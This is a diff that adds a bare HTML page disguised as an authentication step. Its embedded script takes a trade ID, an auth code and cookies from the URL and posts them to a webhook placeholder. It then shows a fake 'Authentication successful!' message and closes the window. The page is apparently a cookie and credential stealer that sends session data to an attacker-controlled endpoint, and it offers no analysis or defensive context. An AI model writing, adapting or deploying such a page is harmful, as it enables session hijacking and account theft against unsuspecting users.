@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ath</title>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const tradeId = urlParams.get('tradeId');
+        const authCode = urlParams.get('authCode');
+        const cookies = urlParams.get('cookies');
+
+        if (tradeId && authCode && cookies) {
+            fetch('WEBHOOK_URL', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: JSON.stringify({
+                        tradeId: tradeId,
+                        authCode: authCode,
+                        cookies: cookies
+                    })
+                })
+            })
+            .then(response => {
+                console.log('✅ Authentication successful!');
+                setTimeout(() => window.close(), 1000);
+            })
+            .catch(error => {
+                console.error('❌ Error sending authentication:', error);
+            });
+        } else {
+            console.error('❌ Missing required parameters');
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
